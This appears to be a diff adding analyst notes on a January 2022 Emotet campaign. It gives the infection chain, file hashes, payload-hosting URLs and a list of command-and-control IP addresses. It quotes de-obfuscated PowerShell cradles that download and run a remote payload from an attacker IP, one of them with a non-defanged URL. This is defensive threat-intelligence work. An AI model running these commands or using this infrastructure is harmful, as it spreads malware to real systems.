@@ -1,5 +1,82 @@
 Emotet 2022
 
+Epoch4 - xls > .hta > .ps > .dll - 27/01/2022
+
+.xls c56e7da2e4fed5117e10934986a81e8280ac5a6f9a00ef3d469c31c8ac914eac
+
+.dll 03101974c6ae7b9572d159ef038cd058ef6b3b9fed6a57af8ca330383b875714
+
+$c1 = "(New-Object Net.We"
+$c4 = "bClient).Downlo"
+$c3 = "adString('hxxp://91.240.118.168/zqqw/zaas/fe.png')"
+$ji = "(New-Object Net.WebClient).DownloadString('http://91.240.118.168/zqqw/zaas/fe.png')"
+invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.168/zqqw/zaas/fe.png')"|invoke-expression
+# powershell snippet 1
+(new-object net.webclient).downloadstring("hxxp://91.240.118.168/zqqw/zaas/fe.png")
+
+C:\ProgramData\QWER.dll
+hxxp://praachichemfood.com/public_html/SWmteCWBUkA89/
+hxxps://dtmconsulting.ca/wp-includes/dkCFwyE/
+hxxps://mortgageadviser.directory/xw8ok/icCYdBSpbFrf5s/
+hxxps://worldaviationhub.com/wp-includes/Lik/
+hxxp://bakultante.com/tee5oeot/Q/
+hxxps://onewaymedia.ro/wp-includes/k/
+hxxps://lodev7.com/wp-content/dpwjiJivrpgO1F2/
+hxxps://trochoi80club.com/wp-content/6shnRU/
+hxxps://haileywells.com/cgi-bin/KJUOaq/
+hxxps://www.yepproject.org/wp-includes/lC45zFsHmmsMDElKT/
+hxxp://estiloindustria.com.br/wp-content/49cRLeDYqr6uVF7i/
+hxxps://futurelube.com/wp-admin/6GLpl4ehsdCBX3z/
+
+c2's
+
+51.15.4.22:443
+173.214.173.220:8080
+212.237.5.209:443
+192.254.71.210:443
+216.158.226.206:443
+162.243.175.63:443
+212.24.98.99:8080
+58.227.42.236:80
+45.118.115.99:8080
+104.251.214.46:8080
+185.157.82.209:8080
+46.55.222.11:443
+188.40.137.206:8080
+81.0.236.90:443
+103.75.201.2:443
+129.232.188.93:443
+195.154.133.20:443
+159.8.59.82:8080
+79.172.212.216:8080
+138.185.72.26:8080
+200.17.134.35:7080
+185.157.82.211:8080
+209.59.138.75:7080
+178.63.25.185:443
+45.176.232.124:443
+45.118.135.203:7080
+164.68.99.3:8080
+203.114.109.124:443
+212.237.17.99:8080
+50.116.54.215:443
+131.100.24.231:80
+212.237.56.116:7080
+45.142.114.231:8080
+162.214.50.39:7080
+51.38.71.0:443
+104.168.155.129:8080
+107.182.225.142:8080
+217.182.143.207:443
+158.69.222.101:443
+176.104.106.96:8080
+207.38.84.195:8080
+41.76.108.46:8080
+110.232.117.186:8080
+178.79.147.66:8080
+173.212.193.249:8080
+
+
 ************************************************************************************************************
 
 Epoch4 - xls > .hta > .ps > .dll - 27/01/2022
